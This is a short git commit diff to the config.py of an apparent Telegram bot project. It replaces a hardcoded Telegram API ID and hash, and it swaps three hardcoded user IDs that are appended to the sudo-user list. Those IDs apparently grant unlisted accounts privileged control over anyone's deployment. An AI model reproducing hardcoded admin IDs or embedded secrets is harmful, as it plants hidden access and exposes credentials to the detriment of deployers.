043baba185968c70634e7b66b69d4aff4f7c48ad
SACHIN-SANATANI <159048376+SachinxSanatani@users.noreply.github.com>
2024-02-07 20:40:45 +0530

    Update config.py

--- config.py
+++ config.py
@@ -10,8 +10,8 @@ logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s'
 
 
 #values
-API_ID = 18136872
-API_HASH = "312d861b78efcd1b02183b2ab52a83a4"
+API_ID = 29895035
+API_HASH = "f99045304a7ed61779622ed80319b289"
 CMD_HNDLR = getenv("CMD_HNDLR", default=".")
 HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
 HEROKU_API_KEY = config("HEROKU_API_KEY", None)
@@ -26,9 +26,9 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-SUDO_USERS.append(1410250744)
-SUDO_USERS.append(5327845950)
-SUDO_USERS.append(1211015395)
+SUDO_USERS.append(5686404051)
+SUDO_USERS.append(6559138719)
+SUDO_USERS.append(6754241147)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
